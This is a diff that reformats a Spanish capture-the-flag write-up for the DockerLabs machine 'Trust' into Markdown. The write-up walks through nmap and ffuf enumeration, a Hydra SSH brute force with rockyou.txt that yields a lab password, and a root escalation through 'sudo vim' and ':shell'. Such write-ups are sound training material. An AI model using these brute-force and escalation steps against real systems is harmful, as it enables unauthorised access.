@@ -1,108 +1,164 @@
-Writeup: Máquina "Trust" de DockerLabs
-Una guía paso a paso del proceso de auditoría y compromiso total (de usuario a root) de la máquina Trust.
+# Writeup: Máquina "Trust" de DockerLabs
 
-1. Fase de Reconocimiento
-Paso A: Comprobación de conectividad (Ping)
+Una guía paso a paso del proceso de auditoría y compromiso total (de usuario a root) de la máquina **Trust**.
+
+---
+
+## 1. Fase de Reconocimiento
+
+### Paso A: Comprobación de conectividad (Ping)
+
 En primer lugar, verificamos la conectividad con la máquina objetivo mediante un ping.
 
-Bash
+```bash
 ping -c 4 172.17.0.2
-Nota de análisis: La respuesta del ping muestra un TTL (Time to Live) de 64 (o muy cercano), lo que nos indica que el sistema operativo de la máquina víctima es Linux.
+```
 
-Paso B: Escaneo de puertos (Nmap)
-Realizamos un escaneo rápido con nmap para identificar qué puertos y servicios están expuestos en el objetivo.
+**Nota de análisis:**  
+La respuesta del ping muestra un TTL (*Time To Live*) de `64` (o muy cercano), lo que nos indica que el sistema operativo de la máquina víctima es **Linux**.
 
-Bash
+---
+
+### Paso B: Escaneo de puertos (Nmap)
+
+Realizamos un escaneo rápido con `nmap` para identificar qué puertos y servicios están expuestos en el objetivo.
+
+```bash
 nmap 172.17.0.2
-Resultado del escaneo:
+```
 
-Puerto 22/tcp (Open): Servicio SSH activo.
+**Resultado del escaneo:**
 
-Puerto 80/tcp (Open): Servicio HTTP (Servidor Web) activo.
+- `22/tcp` (**open**): servicio **SSH** activo.
+- `80/tcp` (**open**): servicio **HTTP** (servidor web) activo.
 
-2. Enumeración Web (Fuzzing de Directorios)
-Al ver que el puerto 80 está abierto y muestra la página por defecto de Apache (lo que genera un falso positivo de tamaño 10701 bytes), ejecutamos un escaneo de directorios con ffuf filtrando ese tamaño específico e indicando extensiones de archivo comunes.
+---
 
-Comando de Fuzzing:
-Bash
+## 2. Enumeración Web (Fuzzing de directorios)
+
+Al ver que el puerto 80 está abierto y muestra la página por defecto de Apache (falso positivo de tamaño `10701` bytes), ejecutamos un escaneo de directorios con `ffuf` filtrando ese tamaño.
+
+### Comando de fuzzing
+
+```bash
 ffuf -u http://172.17.0.2/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 10701 -e .html,.php,.txt -r -v
-Explicación del comando:
--u http://172.17.0.2/FUZZ: Especifica la URL objetivo, reemplazando la palabra FUZZ con el diccionario.
+```
 
--w .../common.txt: Ruta del diccionario utilizado.
+### Explicación del comando
 
--fs 10701: Filtra y oculta las respuestas cuyo tamaño sea de 10701 bytes (evitando el ruido de la página por defecto).
+- `-u http://172.17.0.2/FUZZ`: especifica la URL objetivo, reemplazando `FUZZ` con cada entrada del diccionario.
+- `-w /usr/share/wordlists/dirb/common.txt`: ruta del diccionario utilizado.
+- `-fs 10701`: filtra y oculta respuestas con tamaño `10701` (evita ruido de la página por defecto).
+- `-e .html,.php,.txt`: fuerza búsqueda de archivos con esas extensiones.
+- `-r`: sigue redirecciones automáticamente.
+- `-v`: modo detallado (*verbose*).
 
--e .html,.php,.txt: Crucial. Fuerza la búsqueda de archivos con estas extensiones específicas.
+### Resultado del fuzzing
 
--r: Sigue las redirecciones automáticas.
+Se descubre la ruta oculta `secret.php`.  
+Al acceder desde el navegador, se visualiza el texto:
 
--v: Modo detallado (verbose).
+> "hola mario"
 
-Resultado del Fuzzing:
-Se descubre la ruta oculta secret.php. Al acceder a ella desde el navegador, se visualiza el texto:
+Esto nos revela un usuario potencial para el sistema: **mario**.
 
-"hola mario"
+---
 
-Esto nos revela un nombre de usuario potencial para el sistema: mario.
+## 3. Intrusión (Fuerza bruta a SSH)
 
-3. Intrusión (Fuerza Bruta a SSH)
-Teniendo el usuario legítimo (mario) y el puerto SSH (22) abierto, utilizamos Hydra junto con el diccionario rockyou.txt para encontrar la contraseña de acceso.
+Teniendo el usuario legítimo (`mario`) y el puerto SSH (`22`) abierto, utilizamos **Hydra** junto al diccionario `rockyou.txt` para encontrar la contraseña.
 
-Comando de Hydra:
-Bash
+### Comando de Hydra
+
+```bash
 hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -v
-Explicación del comando:
--l mario: Define el usuario objetivo.
+```
 
--P .../rockyou.txt: Carga el diccionario de contraseñas más utilizado en el ámbito del pentesting.
+### Explicación del comando
 
--t 4: Limita los hilos a 4 en paralelo. Esto evita saturar el puerto 22 y previene errores de tipo Connection reset by peer.
+- `-l mario`: define el usuario objetivo.
+- `-P /usr/share/wordlists/rockyou.txt`: carga el diccionario de contraseñas.
+- `-t 4`: limita a 4 hilos en paralelo (evita saturación y errores como `Connection reset by peer`).
+- `-v`: modo *verbose* para ver intentos en tiempo real.
 
--v: Modo verbose, muestra los intentos en tiempo real.
+### Credencial obtenida
 
-Credencial Obtenida:
-Usuario: mario
+- **Usuario:** `mario`
+- **Contraseña:** `chocolate`
 
-Contraseña: chocolate
+### Acceso inicial
 
-Acceso Inicial:
-Nos conectamos de forma segura mediante SSH a la máquina víctima:
+Nos conectamos por SSH a la máquina víctima:
 
-Bash
+```bash
 ssh mario@172.17.0.2
-Introducimos la contraseña chocolate y ganamos acceso al sistema como el usuario local.
+```
 
-4. Escalada de Privilegios (De Mario a Root)
-Una vez dentro del sistema, el primer paso obligado es comprobar nuestros privilegios sudo actuales.
+Introducimos la contraseña `chocolate` y ganamos acceso como usuario local.
 
-Comando:
-Bash
+---
+
+## 4. Escalada de privilegios (de mario a root)
+
+Una vez dentro del sistema, comprobamos privilegios sudo:
+
+```bash
 sudo -l
-Salida del comando:
-Fragmento de código
+```
+
+### Salida relevante
+
+```text
 mario@7e140299d80a:~$ sudo -l
-[sudo] password for mario: 
+[sudo] password for mario:
 Matching Defaults entries for mario on 7e140299d80a:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
 
 User mario may run the following commands on 7e140299d80a:
     (ALL) /usr/bin/vim
-El resultado nos indica que el usuario mario puede ejecutar el editor de texto /usr/bin/vim como root sin restricciones.
+```
 
-Explotación de Vim (Escape de Consola):
-Iniciamos Vim utilizando privilegios de administrador:
+El resultado indica que `mario` puede ejecutar `/usr/bin/vim` como `root` sin restricciones.
 
-Bash
+### Explotación de Vim (escape de consola)
+
+Iniciamos Vim con privilegios elevados:
+
+```bash
 sudo vim
-Una vez que el editor interactivo de Vim se abre en pantalla, aprovechamos su capacidad para ejecutar comandos del sistema e invocar una consola. Escribimos dentro de Vim:
+```
 
-Fragmento de código
+Dentro de Vim, ejecutamos:
+
+```vim
 :shell
-Al presionar Enter, el proceso hijo hereda los privilegios de sudo de Vim, abriéndonos una terminal con el nivel más alto de administración.
+```
 
-Confirmación de Privilegios:
-Bash
-root@7e140299d80a:/usr/bin# whoami
+Al presionar Enter, se abre una shell heredando los privilegios de `sudo`, obteniendo terminal como **root**.
+
+### Confirmación de privilegios
+
+```bash
+whoami
+```
+
+Salida esperada:
+
+```text
 root
-¡Máquina completamente comprometida! Hemos obtenido acceso como el usuario root.
+```
+
+✅ ¡Máquina completamente comprometida! Hemos obtenido acceso como **root**.
+
+---
+
+## Conclusión
+
+La cadena de compromiso fue:
+
+1. **Reconocimiento** (`ping`, `nmap`)
+2. **Enumeración web** (`ffuf`) → descubrimiento de `secret.php`
+3. **Acceso inicial** por SSH con Hydra (`mario:chocolate`)
+4. **Escalada de privilegios** abusando de `sudo vim` + `:shell`
+
+---
